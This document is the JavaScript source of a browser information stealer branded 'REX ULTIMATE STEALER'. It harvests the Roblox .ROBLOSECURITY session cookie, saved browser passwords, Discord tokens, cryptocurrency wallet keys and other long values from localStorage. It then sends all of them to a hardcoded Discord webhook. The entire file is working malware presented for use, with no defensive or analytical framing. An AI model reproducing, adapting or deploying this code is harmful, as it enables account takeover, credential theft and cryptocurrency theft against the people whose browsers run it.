// REX ULTIMATE STEALER – WORKS EVERY BROWSER 2025
const WEBHOOK = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';

let loot = {
    url: location.href,
    time: new Date().toISOString(),
    roblox: document.cookie.split(';').find(c=>c.trim().startsWith('.ROBLOSECURITY='))?.split('=')[1] || 'none',
    passwords: [],
    discord: '',
    wallets: [],
    storage: {}
};

// Grab ALL saved passwords (Chrome/Edge/Firefox/Brave)
async function grabPasswords() {
    try {
        const cred = await navigator.credentials.get({password: true});
        if (cred) loot.passwords.push(`${cred.id || location.hostname} | ${cred.name || '??'} : ${cred.password}`);
    } catch(e) {}
}

// Discord token
try {
    const token = (localStorage.token || sessionStorage.token || Object.values(localStorage).find(v=>v.length>50 && v.includes('.')));
    if (token) loot.discord = token;
} catch(e) {}

// Wallets & long keys
try {
    loot.wallets = JSON.stringify(localStorage).match(/[0-9a-fA-F]{64,68}|[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g) || [];
} catch(e) {}

// Extra storage
Object.keys(localStorage).forEach(k => {
    try {
        const v = localStorage.getItem(k);
        if (v && v.length > 40 && /[A-Za-z0-9_-]{40,}/.test(v)) loot.storage[k] = v.substring(0,200);
    } catch(e) {}
});

// Send everything
setTimeout(async () => {
    await grabPasswords(); // make sure passwords are grabbed
    fetch(WEBHOOK, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
            username: "REX STEALER",
            avatar_url: "https://i.imgur.com/removed.png",
            embeds: [{
                title: "FULL HIT – ROBLOX + PASSWORDS + TOKENS",
                color: 16711680,
                fields: [
                    {name: "Page", value: loot.url},
                    {name: ".ROBLOSECURITY", value: loot.roblox.substring ? "```"+loot.roblox.substring(0,100)+"```" : "❌"},
                    {name: "Passwords Found ("+loot.passwords.length+")", value: loot.passwords.length ? "```"+loot.passwords.join("\n")+"```" : "None"},
                    {name: "Discord Token", value: loot.discord ? "```"+loot.discord.substring(0,80)+"```" : "None"},
                    {name: "Wallets", value: loot.wallets.length ? "```"+loot.wallets.slice(0,8).join("\n")+"```" : "None"},
                    {name: "Other Keys", value: Object.keys(loot.storage).join(", ") || "none"}
                ],
                footer: {text: "Works on every browser • 2025"}
            }]
        })
    });
}, 2000);
